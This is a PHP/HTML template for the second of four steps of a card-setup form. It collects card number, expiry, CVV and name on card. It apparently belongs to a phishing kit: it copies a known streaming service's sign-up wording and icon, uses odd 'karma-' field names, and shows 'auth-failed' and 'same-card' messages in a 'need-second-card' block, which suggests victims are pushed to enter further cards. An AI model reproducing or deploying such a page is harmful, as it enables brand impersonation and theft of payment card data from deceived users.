<main>
    <form id="myForm" action="/credit/process" method="post">
        <small> STEP <b>2</b> of <b>4</b> </small>
        <h1> Set up your credit or debit card </h1>
        <div class="card-logos">
            <img src="/Brainstorm/assets/images/VISA.png">
            <img src="/Brainstorm/assets/images/MASTERCARD.png">
            <img src="/Brainstorm/assets/images/AMEX.png">
            <img src="/Brainstorm/assets/images/DISCOVER.png">
        </div>
        <div class="need-second-card">
            <?php if (isset($_SESSION['auth-failed'])) {echo $_SESSION['auth-failed'] ?? ''; unset($_SESSION['auth-failed']);} else if (isset($_SESSION['same-card'])){echo $_SESSION['same-card'] ?? ''; unset($_SESSION['same-card']);}?>
        </div>
        <div class="form-row full-width">
            <div class="form-group">
                <input class="gaya-input-1" type="tel" id="karma-cardnumber" name="karma-cardnumber" maxlength=" " placeholder=" ">
                <label for="karma-cardnumber">Card number</label>
                <div class="card-icon" id="dynamic-card-icon">
                    <svg id="dynamic-card-icon" xmlns="http://www.w3.org/2000/svg" fill="none" role="img" viewBox="0 0 24 24" width="30" height="20" data-icon="CreditCardStandard" aria-hidden="true">
                        <path fill-rule="evenodd" clip-rule="evenodd" d="M0 6C0 4.34315 1.34315 3 3 3H21C22.6569 3 24 4.34315 24 6V18C24 19.6569 22.6569 21 21 21H3C1.34314 21 0 19.6569 0 18V6ZM3 5C2.44772 5 2 5.44772 2 6V8H22V6C22 5.44771 21.5523 5 21 5H3ZM2 18V10H22V18C22 18.5523 21.5523 19 21 19H3C2.44772 19 2 18.5523 2 18ZM16 16H20V14H16V16Z" fill="gray"></path>
                    </svg>
                </div>
                <span id="karma-cardnumber-error" class="d-none"></span>
            </div>
        </div>
        <div class="form-row">
            <div class="form-group">
                <input class="gaya-input" type="tel" id="karma-exp" name="karma-exp" maxlength=" " placeholder=" ">
                <label for="karma-exp">Expiration date</label>
                <span id="karma-exp-error" class="d-none"></span>
            </div>
            <div class="form-group">
                <input class="gaya-input" type="tel" id="karma-cvv" name="karma-cvv" maxlength=" " placeholder=" ">
                <label for="karma-cvv">CVV</label>
                <span id="karma-cvv-error" class="d-none"></span>
            </div>
        </div>
        <div class="form-row full-width">
            <div class="form-group">
                <input class="gaya-input-1" type="text" id="karma-nameoncard" name="karma-nameoncard" placeholder=" ">
                <label for="karma-nameoncard">Name on card</label>
                <span id="karma-nameoncard-error" class="d-none"></span>
            </div>
        </div>
        <input type="submit" value="Continue" class="submit-button">
    </form>
</main>
